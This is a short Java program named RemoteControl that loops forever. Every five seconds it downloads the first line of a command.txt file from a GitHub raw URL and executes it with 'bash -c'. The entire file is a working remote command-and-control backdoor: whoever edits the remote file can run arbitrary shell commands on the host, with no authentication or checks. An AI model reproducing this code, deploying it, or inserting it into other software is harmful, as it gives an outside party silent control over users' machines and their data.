import java.io.*;
import java.net.*;

public class RemoteControl {
	
	public static void main(String args[]) {
		
		while (true) {
			try {
				Thread.sleep(5000);
				System.out.println("Executing command...");
				URL url = new URL("https://raw.githubusercontent.com/LittlestCube/RemoteControl/master/command.txt");
				BufferedReader buffer = new BufferedReader(new InputStreamReader(url.openStream()));
				String command = buffer.readLine();
				Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", command});
			} catch(Exception e) { System.err.println("Whoops! Error in function main(): " + e.toString()); }
		
		}
		
	}
	
}